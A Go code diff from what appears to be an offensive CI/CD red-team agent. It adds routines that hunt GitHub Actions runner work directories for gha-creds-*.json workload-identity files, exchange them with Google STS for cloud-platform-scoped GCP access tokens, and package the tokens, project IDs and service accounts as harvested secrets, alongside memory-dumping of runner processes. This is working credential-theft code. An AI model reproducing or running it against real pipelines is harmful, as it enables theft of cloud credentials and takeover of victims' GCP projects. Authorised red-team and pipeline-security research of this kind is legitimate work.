@@ -10,6 +10,8 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io/fs"
+	"net/url"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -19,11 +21,13 @@ import (
 	"time"
 
 	"github.com/boostsecurityio/smokedmeat/internal/models"
+	"golang.org/x/oauth2/google/externalaccount"
 )
 
 const (
 	residentWatchInterval      = 100 * time.Millisecond
 	residentHarvestRetryWindow = 20 * time.Second
+	residentGCPCredentialLimit = 128 * 1024
 )
 
 var residentHarvestAttemptDelays = []time.Duration{
@@ -35,6 +39,8 @@ var residentHarvestAttemptDelays = []time.Duration{
 	5 * time.Second,
 	8 * time.Second,
 }
+
+var residentExchangeGCPExternalAccount = exchangeResidentGCPExternalAccount
 
 type residentWorkerProcess struct {
 	PID       int
@@ -88,7 +94,7 @@ func residentWorkerKey(worker residentWorkerProcess) string {
 func (a *Agent) harvestResidentWorker(ctx context.Context, worker residentWorkerProcess) {
 	memdumpC := make(chan *MemDumpResult, 1)
 	go func() {
-		memdumpC <- a.dumpResidentWorkerSecrets(ctx, worker.PID)
+		memdumpC <- a.dumpResidentWorkerSecrets(ctx, worker)
 	}()
 
 	observed := models.ResidentJobObservation{
@@ -117,7 +123,7 @@ func (a *Agent) harvestResidentWorker(ctx context.Context, worker residentWorker
 	harvested := observed
 	harvested.Event = models.ResidentJobEventHarvested
 	harvested.HarvestedAt = time.Now().UTC()
-	if memdump.Error != "" {
+	if residentMemDumpHardFailure(memdump) {
 		harvested.Event = models.ResidentJobEventHarvestFailed
 		harvested.Error = memdump.Error
 	}
@@ -134,7 +140,7 @@ func refreshResidentWorkerObservation(ctx context.Context, worker residentWorker
 	return observed
 }
 
-func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, pid int) *MemDumpResult {
+func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, worker residentWorkerProcess) *MemDumpResult {
 	deadline := time.NewTimer(residentHarvestRetryWindow)
 	defer deadline.Stop()
 
@@ -151,7 +157,7 @@ func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, pid int) *MemDump
 				case <-timer.C:
 				}
 			}
-			results <- a.dumpResidentProcessTreeSecrets(pid, delay == 2*time.Second)
+			results <- a.dumpResidentWorkerAttempt(ctx, worker, residentHarvestAttemptIncludesRoot(delay))
 		}()
 	}
 
@@ -160,22 +166,29 @@ func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, pid int) *MemDump
 	for remaining := len(residentHarvestAttemptDelays); remaining > 0; {
 		select {
 		case <-ctx.Done():
-			return residentMemDumpFallback(pid, empty, failed)
+			return residentMemDumpFallback(worker.PID, empty, failed)
 		case <-deadline.C:
-			return residentMemDumpFallback(pid, empty, failed)
+			return residentMemDumpFallback(worker.PID, empty, failed)
 		case result := <-results:
 			remaining--
 			if residentMemDumpHasData(result) {
 				return result
 			}
 			if result != nil && result.Error == "" {
-				empty = mergeResidentMemDumpStats(pid, empty, result)
+				empty = mergeResidentMemDumpStats(worker.PID, empty, result)
 			} else if result != nil {
-				failed = mergeResidentMemDumpStats(pid, failed, result)
+				failed = mergeResidentMemDumpStats(worker.PID, failed, result)
 			}
 		}
 	}
-	return residentMemDumpFallback(pid, empty, failed)
+	return residentMemDumpFallback(worker.PID, empty, failed)
+}
+
+func (a *Agent) dumpResidentWorkerAttempt(ctx context.Context, worker residentWorkerProcess, includeRoot bool) *MemDumpResult {
+	if result := a.dumpResidentGCPWorkloadCredentials(ctx, worker.Root); residentMemDumpHasData(result) {
+		return result
+	}
+	return a.dumpResidentProcessTreeSecrets(worker.PID, includeRoot)
 }
 
 func (a *Agent) dumpResidentProcessTreeSecrets(pid int, includeRoot bool) *MemDumpResult {
@@ -243,9 +256,267 @@ func residentMemDumpFallback(pid int, empty, failed *MemDumpResult) *MemDumpResu
 		return empty
 	}
 	if failed != nil {
+		if residentMemDumpTimingMiss(failed.Error) {
+			failed.Error = "runner memory scan found no secrets"
+		}
 		return failed
 	}
 	return &MemDumpResult{ProcessID: pid, Error: "runner memory scan found no secrets"}
+}
+
+func residentMemDumpHardFailure(result *MemDumpResult) bool {
+	if result == nil || result.Error == "" {
+		return false
+	}
+	return !residentMemDumpNoSecrets(result.Error)
+}
+
+type residentGCPAccessToken struct {
+	AccessToken    string
+	Project        string
+	ServiceAccount string
+	Expiry         time.Time
+}
+
+type residentGCPExternalAccountMetadata struct {
+	Project        string
+	ServiceAccount string
+}
+
+func (a *Agent) dumpResidentGCPWorkloadCredentials(ctx context.Context, root string) *MemDumpResult {
+	path := newestResidentGCPCredentialFile(root)
+	if path == "" {
+		return nil
+	}
+	data, err := os.ReadFile(path)
+	if err != nil || len(data) == 0 || len(data) > residentGCPCredentialLimit {
+		return nil
+	}
+	token, err := residentExchangeGCPExternalAccount(ctx, data)
+	if err != nil || strings.TrimSpace(token.AccessToken) == "" {
+		return nil
+	}
+
+	vars := make([]string, 0, 5)
+	if token.Project != "" {
+		vars = append(vars,
+			residentRunnerVarRaw("CLOUDSDK_CORE_PROJECT", token.Project),
+			residentRunnerVarRaw("GCLOUD_PROJECT", token.Project),
+			residentRunnerVarRaw("GOOGLE_CLOUD_PROJECT", token.Project),
+		)
+	}
+	if token.ServiceAccount != "" {
+		vars = append(vars, residentRunnerVarRaw("GCP_SERVICE_ACCOUNT", token.ServiceAccount))
+	}
+	if !token.Expiry.IsZero() {
+		vars = append(vars, residentRunnerVarRaw("GCP_ACCESS_TOKEN_EXPIRES_AT", token.Expiry.UTC().Format(time.RFC3339)))
+	}
+
+	return &MemDumpResult{
+		ProcessID:      os.Getpid(),
+		Secrets:        []string{residentRunnerSecretRaw("GCP_ACCESS_TOKEN", token.AccessToken)},
+		Vars:           vars,
+		ScanAttempts:   1,
+		ProcessTargets: 1,
+	}
+}
+
+func newestResidentGCPCredentialFile(root string) string {
+	if !residentRunnerRoot(root) {
+		return ""
+	}
+	workRoot := filepath.Join(root, "_work")
+	var newest string
+	var newestMod time.Time
+	seen := 0
+	_ = filepath.WalkDir(workRoot, func(path string, entry fs.DirEntry, err error) error {
+		if err != nil {
+			return nil
+		}
+		seen++
+		if seen > 5000 {
+			if entry.IsDir() {
+				return filepath.SkipDir
+			}
+			return nil
+		}
+		if entry.IsDir() {
+			return nil
+		}
+		name := entry.Name()
+		if !strings.HasPrefix(name, "gha-creds-") || !strings.HasSuffix(name, ".json") {
+			return nil
+		}
+		info, err := entry.Info()
+		if err != nil || info.Size() <= 0 || info.Size() > residentGCPCredentialLimit {
+			return nil
+		}
+		if newest == "" || info.ModTime().After(newestMod) {
+			newest = path
+			newestMod = info.ModTime()
+		}
+		return nil
+	})
+	return newest
+}
+
+func exchangeResidentGCPExternalAccount(ctx context.Context, data []byte) (residentGCPAccessToken, error) {
+	metadata, err := residentGCPExternalAccountMetadataFromJSON(data)
+	if err != nil {
+		return residentGCPAccessToken{}, err
+	}
+	var cfg externalaccount.Config
+	if err := json.Unmarshal(data, &cfg); err != nil {
+		return residentGCPAccessToken{}, err
+	}
+	cfg.Scopes = []string{"https://www.googleapis.com/auth/cloud-platform"}
+	ts, err := externalaccount.NewTokenSource(ctx, cfg)
+	if err != nil {
+		return residentGCPAccessToken{}, err
+	}
+	tok, err := ts.Token()
+	if err != nil {
+		return residentGCPAccessToken{}, err
+	}
+	return residentGCPAccessToken{
+		AccessToken:    tok.AccessToken,
+		Expiry:         tok.Expiry,
+		Project:        metadata.Project,
+		ServiceAccount: metadata.ServiceAccount,
+	}, nil
+}
+
+func residentGCPExternalAccountMetadataFromJSON(data []byte) (residentGCPExternalAccountMetadata, error) {
+	var cfg struct {
+		Type                             string `json:"type"`
+		TokenURL                         string `json:"token_url"`
+		ServiceAccountImpersonationURL   string `json:"service_account_impersonation_url"`
+		QuotaProjectID                   string `json:"quota_project_id"`
+		WorkforcePoolUserProject         string `json:"workforce_pool_user_project"`
+		ServiceAccountImpersonationEmail string `json:"service_account_impersonation_email"`
+		CredentialSource                 struct {
+			URL     string            `json:"url"`
+			Headers map[string]string `json:"headers"`
+		} `json:"credential_source"`
+	}
+	if err := json.Unmarshal(data, &cfg); err != nil {
+		return residentGCPExternalAccountMetadata{}, err
+	}
+	if cfg.Type != "external_account" {
+		return residentGCPExternalAccountMetadata{}, fmt.Errorf("unsupported GCP credential type")
+	}
+	if cfg.TokenURL != "" && !residentURLHostIs(cfg.TokenURL, "sts.googleapis.com") {
+		return residentGCPExternalAccountMetadata{}, fmt.Errorf("unsupported GCP token URL")
+	}
+	if !residentURLHostIs(cfg.ServiceAccountImpersonationURL, "iamcredentials.googleapis.com") {
+		return residentGCPExternalAccountMetadata{}, fmt.Errorf("unsupported GCP impersonation URL")
+	}
+	if !residentGitHubOIDCURL(cfg.CredentialSource.URL) {
+		return residentGCPExternalAccountMetadata{}, fmt.Errorf("unsupported GCP credential source")
+	}
+	if !strings.HasPrefix(cfg.CredentialSource.Headers["Authorization"], "Bearer ") {
+		return residentGCPExternalAccountMetadata{}, fmt.Errorf("missing GitHub OIDC authorization header")
+	}
+
+	serviceAccount := strings.TrimSpace(cfg.ServiceAccountImpersonationEmail)
+	if serviceAccount == "" {
+		serviceAccount = residentServiceAccountFromImpersonationURL(cfg.ServiceAccountImpersonationURL)
+	}
+	if serviceAccount == "" {
+		return residentGCPExternalAccountMetadata{}, fmt.Errorf("missing GCP service account")
+	}
+	project := strings.TrimSpace(cfg.QuotaProjectID)
+	if project == "" {
+		project = strings.TrimSpace(cfg.WorkforcePoolUserProject)
+	}
+	if project == "" {
+		project = extractProjectFromSA(serviceAccount)
+	}
+	return residentGCPExternalAccountMetadata{Project: project, ServiceAccount: serviceAccount}, nil
+}
+
+func residentURLHostIs(rawURL, want string) bool {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return false
+	}
+	return strings.EqualFold(u.Hostname(), want)
+}
+
+func residentGitHubOIDCURL(rawURL string) bool {
+	for _, host := range []string{
+		"token.actions.githubusercontent.com",
+		"vstoken.actions.githubusercontent.com",
+		"pipelines.actions.githubusercontent.com",
+	} {
+		if residentURLHostIs(rawURL, host) {
+			return true
+		}
+	}
+	return false
+}
+
+func residentServiceAccountFromImpersonationURL(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return ""
+	}
+	const marker = "/serviceAccounts/"
+	idx := strings.Index(u.Path, marker)
+	if idx < 0 {
+		return ""
+	}
+	value := strings.TrimPrefix(u.Path[idx:], marker)
+	value = strings.TrimSuffix(value, ":generateAccessToken")
+	decoded, err := url.PathUnescape(value)
+	if err != nil {
+		return ""
+	}
+	return decoded
+}
+
+func residentRunnerSecretRaw(name, value string) string {
+	nameJSON, _ := json.Marshal(name)
+	valueJSON, _ := json.Marshal(value)
+	return string(nameJSON) + `{"value":` + string(valueJSON) + `,"isSecret":true}`
+}
+
+func residentRunnerVarRaw(name, value string) string {
+	data, _ := json.Marshal(struct {
+		K string `json:"k"`
+		V string `json:"v"`
+	}{K: name, V: value})
+	return string(data)
+}
+
+func residentHarvestAttemptIncludesRoot(delay time.Duration) bool {
+	return delay >= 2*time.Second
+}
+
+func residentMemDumpTimingMiss(err string) bool {
+	err = normalizeResidentMemDumpError(err)
+	if err == "" {
+		return false
+	}
+	if strings.Contains(err, "runner memory scan found no candidate processes") {
+		return true
+	}
+	if strings.Contains(err, "/proc/") && strings.Contains(err, "no such process") {
+		return true
+	}
+	return strings.Contains(err, "/proc/") && strings.Contains(err, "no such file or directory")
+}
+
+func residentMemDumpNoSecrets(err string) bool {
+	return normalizeResidentMemDumpError(err) == "runner memory scan found no secrets"
+}
+
+func normalizeResidentMemDumpError(err string) string {
+	err = strings.ToLower(strings.TrimSpace(err))
+	if err == "" {
+		return ""
+	}
+	return err
 }
 
 func (a *Agent) sendResidentJob(ctx context.Context, observed models.ResidentJobObservation, memdump *MemDumpResult) error {
